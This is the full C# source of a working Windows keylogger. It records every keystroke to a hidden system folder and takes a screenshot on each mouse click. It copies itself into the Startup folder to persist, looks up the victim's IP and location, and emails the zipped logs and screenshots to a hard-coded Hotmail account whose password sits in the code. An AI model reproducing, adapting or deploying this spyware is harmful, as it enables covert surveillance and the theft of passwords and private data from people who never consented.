using System;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.Text.RegularExpressions;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void LogKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            filepath = filepath + @"\TKH\";

            if (!Directory.Exists(filepath))
            {
                DirectoryInfo loggerFolder = Directory.CreateDirectory(filepath);
                loggerFolder.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
            }

            else
            {
                DirectoryInfo loggedFolder = new FileInfo(filepath).Directory;
                if ((loggedFolder.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                    loggedFolder.Attributes |= FileAttributes.Hidden;

                if ((loggedFolder.Attributes & FileAttributes.System) != FileAttributes.System)
                    loggedFolder.Attributes |= FileAttributes.System;

                if ((loggedFolder.Attributes & FileAttributes.Directory) != FileAttributes.Directory)
                    loggedFolder.Attributes |= FileAttributes.Directory;
            }

            string path = (@filepath + "DC.text");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
                //end
            }

            KeysConverter converter = new KeysConverter();
            string text = string.Empty;

            while (true)
            {
                for (int i = 0; i < 1000; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (GetAsyncKeyState((int)Keys.LButton) < 0)
                    {
                        TakeWindowSnap();
                    }

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }

                        break;
                    }
                }
            }
        }

        static void SendMail()
        {
            String newFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string filepath = newFilePath + @"\TKH\";
            if (!Directory.Exists(filepath))
                return;

            string newFilePath2 = newFilePath + @"\TKH\DC.text";

            DateTime dateTime = DateTime.Now;
            string subtext = "Loggedfiles";
            subtext += " [" + dateTime + "]";

            SmtpClient client = new SmtpClient("smtp.live.com", 25); //hotmail server
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("ianlogger@hotmail.com"); //from
            LOGMESSAGE.To.Add("ianlogger@hotmail.com"); // destination
            LOGMESSAGE.Subject = subtext;

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("ianlogger@hotmail.com", "Semkle1307!"); //email details


            
            string newFile = File.ReadAllText(newFilePath2); // read log file and create new copy
            string attachmentTextFile = newFilePath + @"\TKH\PNT.text"; // name new copy
            File.WriteAllText(attachmentTextFile, newFile);
            LOGMESSAGE.Attachments.Add(new Attachment(attachmentTextFile));

            String imagePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (Directory.Exists(imagePath + @"\TKH\QS\"))
            {
                if(File.Exists(imagePath + @"\TKH\Pack.zip"))
                    File.Delete(imagePath + @"\TKH\Pack.zip");

                ZipFile.CreateFromDirectory(imagePath + @"\TKH\QS\", imagePath + @"\TKH\Pack.zip");
                LOGMESSAGE.Attachments.Add(new Attachment(imagePath + @"\TKH\Pack.zip"));

                DirectoryInfo directory = new DirectoryInfo(imagePath + @"\TKH\QS\");

                foreach (FileInfo file in directory.GetFiles())
                {
                    file.Delete();
                }
                directory.Delete();
            }

            string bodyText = "Date: " + DateTime.Now.ToString();
            bodyText += "\n" + "UserIP: " + GetIpAdress(); //add IP
            bodyText += "\n" + GetIpInfo(GetIpAdress());
            LOGMESSAGE.Body = bodyText;
            client.Send(LOGMESSAGE);
            LOGMESSAGE = null;
        }

        private static int imageID;
        static void TakeWindowSnap()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                String imagePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                imagePath += @"\TKH\QS\";

                if (!Directory.Exists(imagePath))
                    Directory.CreateDirectory(imagePath);

                imagePath += "qs" + imageID.ToString() + " " + DateTime.Now.ToString("d MMMM HH-mm-ss") + ".jpg";
                bitmap.Save(imagePath, ImageFormat.Jpeg);
                imageID++;
            }
        }
        static void SetStartUp()
        {
            if(!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "DC.exe"))
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "DC.exe");
        }

        static string GetIpAdress()
        {
            try
            {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();

                if (externalIP == string.Empty || externalIP == null)
                    return "NOIPFOUND";

                return externalIP;
            }
            catch
            {
                return "NOIPFOUND";
            }
        }

        static string GetIpInfo(string ip)
        {
            try
            {
                string ipInformationstring = string.Empty;
                byte[] ipInfo = (new WebClient()).DownloadData("http://ip-api.com/csv/" + ip.ToString());
                ipInformationstring = System.Text.Encoding.UTF8.GetString(ipInfo);
                if (ipInformationstring == string.Empty || ipInformationstring == null)
                    return "NOINFOFOUND";

                string[] allInfoSplit = ipInformationstring.Split(',');
                string[] infoSort = new string[] 
                { "Status", "Country", "CountryCode", "Region",
                  "RegionName", "City", "Zip", "Latitude", "Longitude", "Timezone", "ISP", "Org",
                  "AS", "Reverse", "Mobile", "Proxy", "Query", "Status", "Message" };

                ipInformationstring = string.Empty;
                for (int i = 0; i < allInfoSplit.Length; i++)
                {
                    allInfoSplit[i] += "\n";
                    ipInformationstring += infoSort[i] + ": ";
                    ipInformationstring += allInfoSplit[i];
                }
                return ipInformationstring;
            }
            catch
            {
                return "NOINFOFOUND";
            }
        }

        static void Main(string[] args)
        {
            SetStartUp();
            Random rand = new Random();
            int randomNumber = rand.Next(1, 10);

            if (randomNumber < 11) 
                SendMail();

            LogKeys();
        }
    }
}
